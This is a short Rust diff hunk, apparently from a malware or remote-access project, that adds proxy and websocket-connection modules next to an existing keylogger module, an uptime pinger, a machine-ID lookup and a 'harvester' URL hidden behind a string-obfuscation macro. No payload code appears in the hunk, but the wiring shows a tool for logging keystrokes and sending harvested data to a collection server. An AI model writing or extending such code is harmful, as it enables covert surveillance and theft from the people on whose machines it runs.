@@ -16,6 +16,12 @@ pub use uptime_pinger::uptime_pinger;
 mod keylogger;
 pub use keylogger::keylogger;
 
+mod proxy;
+pub use proxy::proxy;
+
+mod ws_connection;
+pub use ws_connection::WsConnection;
+
 static HARVESTER_URL: Lazy<&'static str> = Lazy::new(|| muddy!("localhost:6767"));
 static MACHINE_ID: Lazy<String> =
     Lazy::new(|| machine_uid::machine_id::get_machine_id().unwrap_or("unknown".into()));
